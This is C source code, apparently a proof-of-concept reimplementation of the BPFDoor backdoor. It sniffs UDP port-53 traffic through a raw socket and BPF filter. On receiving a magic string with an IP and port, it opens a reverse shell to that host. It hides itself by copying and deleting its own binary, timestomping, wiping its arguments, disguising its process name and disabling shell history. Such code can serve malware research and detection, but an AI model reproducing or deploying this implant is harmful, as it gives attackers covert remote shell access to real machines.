#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <linux/if_ether.h>
#include <linux/filter.h>
#include <fcntl.h>
#include <getopt.h>

#include "shared.h"

const char *pidfile = PID_FILENAME;

void apply_bpf_filter(int sd);
void reverse_shell(char *host, int port);
void pid_or_die(int opts);
char *copy_bin(int opts);
void delete_bin(int opts);
void exec_copy_with_init(int opts, char *path);
void unlink_pidfile();
void clean_args(int opts, int argc, char *argv[]);

char *copy_path();

void sig_term(int sig) {
	unlink_pidfile();
	exit(0);
}

#define BOP_INIT (1 << 0)
#define BOP_NOCOPY (1 << 1)
#define BOP_NOPID (1 << 2)
#define BOP_NOENV (1 << 3)

int main(int argc, char *argv[]) {
	int sd, pkt_size;
	char *buf;
        unsigned int opts = 0;

        while (1) {
		int opt_idx;
		// important: order of args must align with opts mask
		static struct option long_options[] = {
			{"init",   no_argument, 0, 0},
			{"nocopy", no_argument, 0, 0},
			{"nopid",  no_argument, 0, 0},
			{"noenv",  no_argument, 0, 0},
			{0, 0, 0, 0}
		};
		char c = getopt_long(argc, argv, "", long_options, &opt_idx);
		if (c == -1) break;

		switch (c) {
		case 0:
			printf("option %s", long_options[opt_idx].name);
			if (optarg)
				printf(" with arg %s", optarg);
			printf("\n");

			opts = opts | (1 << opt_idx);
			break;
		default:
			printf("?? getopt return character code 0%o ??\n", c);
			exit(1);
			break;
		}
	}

	if (opts & BOP_INIT) {
		pid_or_die(opts);
		clean_args(opts, argc, argv);
	} else {
		char *path = copy_bin(opts);
		if (fork() == 0) {
			exec_copy_with_init(opts, path);
			exit(0);
		}
		delete_bin(opts);
		exit(0);
	}

	buf = malloc(65535);

	// raw IP sockets
	if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP))) < 0) {
		perror("error creating socket");
		exit(1);
	}

	apply_bpf_filter(sd);

	// ignore SIGCHLD
	signal(SIGCHLD,SIG_IGN);
	signal(SIGTERM,sig_term);

listen_loop:
	while(1) {
		if ((pkt_size = recvfrom(sd, buf, 65535, 0, NULL, NULL)) < 0) {
			perror("error receiving from socket");
			goto listen_loop;
		}

		// skip over ethernet, ip, and udp headers
		char *data = (char *)(buf + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr));
		size_t data_sz = pkt_size - (data - buf);
		if (data_sz <= 0) goto listen_loop;

		// check for magic byte sequence
		if (data_sz > strlen(MAGIC_STR)
		    && strncmp(data, MAGIC_STR, strlen(MAGIC_STR)) == 0) {
			int i;
			char host[20];
			char port[20];
			const size_t max_len = 20;

			// skip over magic
			data += strlen(MAGIC_STR);
			data_sz -= strlen(MAGIC_STR);

			// read IP
			for (i=0; data[i] != ':'; i++) {
				// don't overrun the buffer
				if (i >= max_len) {
					fprintf(stderr, "error: payload dest address (too long)\n");
					goto listen_loop;
				}

				// ensure data is formatted OK
				if (data[i] != '.' && !(data[i] >= '0' && data[i] <= '9')) {
					fprintf(stderr, "error: payload bad format\n");
					goto listen_loop;
				}

				host[i] = data[i];
			}
			host[i] = 0;

			// skip :
			data += i + 1;
			data_sz -= i + 1;

			// read port number
			for (i=0; data[i] != 0; i++) {
				if (i >= max_len) {
					fprintf(stderr, "error: payload format (too long)\n");
					goto listen_loop;
				}
				if (data[i] < '0' || data[i] > '9') {
					fprintf(stderr, "error: payload port format\n");
					goto listen_loop;
				}
				port[i] = data[i];
			}
			port[i] = 0;

			// fork a child for reverse shell
			if (fork() == 0) {
				if (fork() != 0) exit(0); // double fork to reparent
				reverse_shell(host, atoi(port));
				exit(0);
			}
		}
	}

	close(sd);
	free(buf);
	unlink_pidfile();
	return 0;
}

void apply_bpf_filter(int sd) {
	// tcpdump udp and dst port 53 -dd
	struct sock_filter filter[] = {
		{ 0x28, 0, 0, 0x0000000c },
		{ 0x15, 0, 4, 0x000086dd },
		{ 0x30, 0, 0, 0x00000014 },
		{ 0x15, 0, 11, 0x00000011 },
		{ 0x28, 0, 0, 0x00000038 },
		{ 0x15, 8, 9, 0x00000035 },
		{ 0x15, 0, 8, 0x00000800 },
		{ 0x30, 0, 0, 0x00000017 },
		{ 0x15, 0, 6, 0x00000011 },
		{ 0x28, 0, 0, 0x00000014 },
		{ 0x45, 4, 0, 0x00001fff },
		{ 0xb1, 0, 0, 0x0000000e },
		{ 0x48, 0, 0, 0x00000010 },
		{ 0x15, 0, 1, 0x00000035 },
		{ 0x6, 0, 0, 0x00040000 },
		{ 0x6, 0, 0, 0x00000000 },
	};
	size_t filter_size = sizeof(filter) / sizeof(struct sock_filter);
	struct sock_fprog bpf = {
		.len = filter_size,
		.filter = filter,
	};

	if ((setsockopt(sd, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf))) < 0) {
		perror("Error creating socket");
		exit(1);
	}
}

void reverse_shell(char *host, int port) {
	int sd;
	struct sockaddr_in cnc;

	sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   
	memset((char *)&cnc, 0, sizeof(cnc));
	cnc.sin_family = AF_INET;
	cnc.sin_port = htons(port);
	cnc.sin_addr.s_addr = inet_addr(host);

	fprintf(stderr, "connecting to %s:%i\n", host, port);
	int r = connect(sd, (struct sockaddr *) &cnc, sizeof(cnc));
	if (r != 0) {
		fprintf(stderr, "error: %s\n", strerror(errno));
		return;
	}
    
	dup2(sd, 0);
	dup2(sd, 1);
	dup2(sd, 2);

	// shell arguments and environment
	char *args[] = {
		"bpfdoorpoc: remote shell process",
		NULL
	};
	char *env[] = {
		"HOME=/tmp",
		"HISTFILE=/dev/null",
		"MYSQL_HISTFILE=/dev/null",
		"PATH=/bin:/usr/kerberos/sbin:/usr/kerberos/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin:./bin",
		"TERM=vt100",
		NULL
	};
	execve("/bin/sh", args, env);
}

void unlink_pidfile() {
	unlink(pidfile);
}

void pid_or_die(int opts) {
	if (opts & BOP_NOPID) return;

	struct stat sb;

	// die if pid file exists
	if (stat(pidfile, &sb) == 0) {
		fprintf(stderr, "error: already running\n");
		exit(0);
	}

	// create pid file
	char spid[16];
	int spid_len = snprintf(spid, 16, "%i", getpid());
	int fd = open(pidfile, O_RDWR | O_CREAT, 0644);
	if (fd < 0) {
		fprintf(stderr, "error: could not open pidfile: %s\n", strerror(errno));
		exit(1);
	}
	write(fd, spid, spid_len);
	close(fd);

	fprintf(stderr, "pid: %s\n", spid);
}

int bin_path(char *path) {
	return readlink("/proc/self/exe", path, 256-1);
}

char *copy_bin(int opts) {
	static char path[256];
	ssize_t len;
	char buf[1024];

	len = bin_path(path);
	if (len == -1) exit(0); // couldn't read self. exit

	// we're not copying, return original path
	if (opts & BOP_NOCOPY) return path;

	fprintf(stderr, "copy %s to %s\n", path, copy_path());

	int rd = open(path, O_RDONLY);
	if (rd < 0) exit(0);

	int wd = open(copy_path(), O_WRONLY | O_CREAT, 0755);
	if (wd < 0) exit(0);

	while ((len = read(rd, buf, sizeof(buf))))
		write(wd, buf, len);
	close(rd);
	close(wd);

	// timestomp
	struct timeval tv[2];
	tv[0].tv_sec = 1225394236;
	tv[0].tv_usec = 0;
	tv[1].tv_sec = 1225394236;
	tv[1].tv_usec = 0;
	utimes(copy_path(), tv);

	return copy_path();
}

void delete_bin(int opts) {
	if (opts & BOP_NOCOPY) return;

	static char path[256];
	ssize_t len;

	len = bin_path(path);
	if (len == -1) return; // couldn't read self. ignore
	path[len] = '\0';

	fprintf(stderr, "unlink: %s\n", path);
	unlink(path);
}

char *copy_path() {
	static char path[256];
	static ssize_t len = 0;

	if (len != 0) return path;

	len = bin_path(path);
	if (len == -1) exit(0);
	path[len++] = 'x';
	path[len] = '\0';

	return path;
}

void exec_copy_with_init(int opts, char *path) {
	fprintf(stderr, "execing %s\n", path);

	// shell arguments and environment
	char *args[] = {
		"bpfdoorpoc: resident process",
		"--init",
		(opts & BOP_NOPID) ? "--nopid" : NULL,
		NULL
	};
	char *env[] = {
		NULL
	};
	execve(path, args, env);
}

void clean_args(int opts, int argc, char *argv[]) {
	for (int i = 1; i < argc; i++)
		memset(argv[i], 0, strlen(argv[i]));
}
